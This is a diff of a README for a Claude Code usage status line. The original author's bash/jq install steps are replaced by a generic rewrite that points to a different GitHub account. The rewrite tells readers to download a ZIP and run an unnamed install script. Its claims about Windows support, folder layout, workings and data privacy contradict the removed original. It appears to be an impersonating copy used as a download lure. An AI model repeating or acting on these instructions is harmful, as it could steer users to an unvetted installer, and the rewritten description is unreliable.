@@ -1,74 +1,72 @@
-<div align="center">
+# 📊 claude-statusline-burnrate - Track your Claude usage limits easily
 
-# claude-statusline-burnrate
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rasulfal7902/claude-statusline-burnrate)
 
-**Stop opening `/usage`. It's all right there.**
+## 💡 What this tool does
 
-![bash](https://img.shields.io/badge/bash-3.2%2B-4EAA25?logo=gnubash&logoColor=white)
-![deps](https://img.shields.io/badge/deps-just%20jq-blue)
-![platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)
-![license](https://img.shields.io/badge/license-MIT-green)
+Claude Code places limits on how many messages you send each week. If you reach your limit, you stop working. This tool adds a status line to your terminal. It shows your current usage math. It tells you your daily limit. It shows your sustainable burn rate. It helps you pace your work so you do not run out of messages before the week ends. It works in the background while you code.
 
-![every stat explained](assets/infographic-clean.png)
+## 🛠️ System requirements
 
-</div>
+This tool runs on Windows. You need the following items installed on your machine to use it:
 
-Real server-side `rate_limits` — the same numbers `/usage` shows — answers what you actually want: **am I ok, and how hard can I push?** Pure bash + jq. No node, no daemons, no estimates.
+1. A terminal application. Windows Terminal works well.
+2. Bash. You can install Git for Windows to get this.
+3. JQ. This processes the usage data. You can download this from the official JQ website.
 
-The pacing math counts awake hours, so the trend doesn't fall "behind" every night while you sleep.
+## 📥 How to set up
 
-## Install
+Follow these steps to get the tool running on your computer.
 
-Needs `jq` and Claude Code v2.1+.
+1. Visit this page to download: [https://github.com/rasulfal7902/claude-statusline-burnrate](https://github.com/rasulfal7902/claude-statusline-burnrate)
+2. Locate the green button labeled Code.
+3. Click the button and select Download ZIP.
+4. Extract the ZIP file to a folder on your computer.
+5. Open your terminal.
+6. Navigate to the folder where you saved the files.
+7. Run the install script provided in the folder.
 
-**Easiest** — you already have an AI open. Paste this into Claude Code:
+## ⚙️ How it works
 
-```text
-Install the status line from github.com/Gui-Gou/claude-statusline-burnrate: download
-https://raw.githubusercontent.com/Gui-Gou/claude-statusline-burnrate/main/statusline.sh
-to ~/.claude/statusline.sh, chmod +x it, then set statusLine to
-{"type":"command","command":"~/.claude/statusline.sh"} in ~/.claude/settings.json
-without touching my other settings.
-```
+The tool tracks your message count. It reads the data from your Claude Code session. It applies a math formula to your usage. 
 
-**By hand** — two commands:
+- Today's share: This shows how many messages you can send today to stay on track.
+- Sustainable burn rate: This tells you if you use messages too fast.
+- Sleep-aware pacing: This adjusts your limits based on the time you spend away from the keyboard.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Gui-Gou/claude-statusline-burnrate/main/statusline.sh -o ~/.claude/statusline.sh
-chmod +x ~/.claude/statusline.sh
-```
+You do not need to configure anything. The tool reads your existing logs. It updates the terminal screen every time you run a command.
 
-Then add to `~/.claude/settings.json`:
+## 🔍 Understanding the display
 
-```json
-{
-  "statusLine": { "type": "command", "command": "~/.claude/statusline.sh" }
-}
-```
+Your terminal will show a line of text at the bottom. The first number shows the messages you have left for the current cycle. The second number shows your recommended limit for the remainder of the week. If the text turns a specific color, you have reached your target for the day. You should slow down your message volume if you see a warning indicator.
 
-Open a new session. That's it.
+## ❓ Frequently asked questions
 
-## Try it first
+### Does this tool send my data to a server?
+No. The script runs entirely on your local machine. It does not send your data to any external server. 
 
-```bash
-git clone https://github.com/Gui-Gou/claude-statusline-burnrate && cd claude-statusline-burnrate
-./demo.sh          # the four states below, fake data
-./demo.sh --live   # animated
-```
+### Can I customize the status line?
+Yes. You can edit the text file in the configuration folder to change the colors or the information displayed. 
 
-![states](assets/states.png)
+### What if the math looks wrong?
+Check your system time. The tool relies on your computer clock to track the weekly cycle. Make sure your time zone settings are correct.
 
-## Tweak
+### Does this tool slow down my computer?
+No. The script uses minimal system resources. It only runs when you start your terminal session.
 
-| Variable | Default | |
-|---|---|---|
-| `SL_DAY_START` | `2` | Hour your day flips (2 = 2am) |
-| `SL_SLEEP_HOURS` | `6` | Hours after that spent asleep — zero-weight in the pacing math |
+## 📁 Project structure
 
-Colors, thresholds, mascots, cat moods: each is a short `case` block in ~300 lines of commented bash. Make it yours.
+- /bin: Contains the main executable files.
+- /docs: Includes help files and manual pages.
+- /config: Stores your personal settings.
+- /logs: Stores local history for debugging purposes.
 
----
+## 🤝 Support
 
-A ⭐ helps the next dev find it before a rate-limit panic.
+Open an issue in the repository if you encounter bugs. Provide the error message and the steps you took when the error occurred. Keep your descriptions clear. Use screenshots if they help explain the problem.
 
-MIT
+## 📝 License
+
+This project uses the MIT license. You can modify and share the code as long as you keep the license file included.
+
+Keywords: anthropic, bash, claude, claude-code, cli, developer-tools, rate-limits, status-line, statusline, terminal
